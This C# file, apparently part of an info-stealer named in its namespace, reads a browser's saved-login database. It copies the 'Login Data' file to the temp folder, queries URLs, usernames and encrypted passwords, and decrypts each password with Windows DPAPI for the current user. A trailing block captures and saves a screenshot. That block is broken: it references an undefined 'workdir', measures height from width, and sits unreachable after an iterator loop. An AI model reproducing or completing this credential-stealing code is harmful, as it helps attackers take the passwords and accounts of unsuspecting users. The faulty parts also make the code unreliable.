using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Principal;
using System.Text;

namespace Dark__tealer__darkside_team
{
   class Passwords
   {
       static string temp = Path.GetTempPath();
       static string username = WindowsIdentity.GetCurrent().Name;

       static public IEnumerable<Tuple<string, string, string>> ReadPass(string dbPath)
       {
           if (File.Exists(temp + @"" + username + "\\Login Data"))  
           {
               File.Delete(temp + @"" + username + "\\Login Data");
           }
           File.Copy(dbPath, temp + @"" + username + "\\Login Data");   
           dbPath = temp + @"" + username + "\\Login Data";
           var connectionString = "Data Source=" + dbPath + ";pooling=false";
           using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
           using (var cmd = conn.CreateCommand())
           {
               cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";
               conn.Open();
               using (var reader = cmd.ExecuteReader())
               {
                   while (reader.Read())
                   {
                       var encryptedData = (byte[])reader[0];
                       var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser); 
                       var plainText = Encoding.ASCII.GetString(decodedData);
                       yield return Tuple.Create(reader.GetString(2), reader.GetString(1), plainText);
                   }
               }
               conn.Close();
           }
            Bitmap Screenshot;
            int width = int.Parse(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString()); 
            int height = int.Parse(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString());
            Screenshot = new Bitmap(1920, 1080);
            Size s = new Size(Screenshot.Width, Screenshot.Height); 
            Graphics memoryGraphics = Graphics.FromImage(Screenshot);
            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
            string screenpath = workdir + "\\Screen.jpg"; 
            Screenshot.Save(screenpath); 
       }
   }
}
